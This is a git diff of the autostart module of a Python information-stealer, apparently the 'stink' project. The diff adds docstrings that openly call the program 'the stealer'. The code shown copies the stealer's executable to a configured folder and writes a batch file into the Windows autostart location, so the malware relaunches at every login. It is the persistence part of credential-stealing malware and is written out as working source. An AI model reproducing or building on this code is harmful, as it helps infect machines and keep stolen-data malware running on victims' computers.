@@ -4,7 +4,9 @@ from stink.helpers.config import AutostartConfig
 
 
 class Autostart:
-
+    """
+    Adds the stealer to autostart.
+    """
     def __init__(self, executor_path: str, errors: bool):
 
         self.__executor_path = executor_path
@@ -12,20 +14,29 @@ class Autostart:
 
         self.__config = AutostartConfig()
 
-    def __create_copy(self):
-
+    def __create_copy(self) -> None:
+        """
+        Creates a copy of the stealer.
+        :return: None
+        """
         self.executor_name = self.__executor_path.replace("\\", "/").split("/")[-1]
         copyfile(self.__executor_path, rf"{self.__config.ExecutorPath}\{self.executor_name}")
 
-    def __add_to_autostart(self):
-
+    def __add_to_autostart(self) -> None:
+        """
+        Adds the stealer to autostart.
+        :return: None
+        """
         with open(rf"{self.__config.AutostartPath}\{self.__config.AutostartName}.bat", "w+") as file:
             file.write(f'@echo off\nstart "{self.__config.AutostartName}" "{self.__config.ExecutorPath}\\{self.executor_name}"')
 
         file.close()
 
-    def run(self):
-
+    def run(self) -> None:
+        """
+        Launches the autostart module.
+        :return: None
+        """
         try:
 
             self.__create_copy()
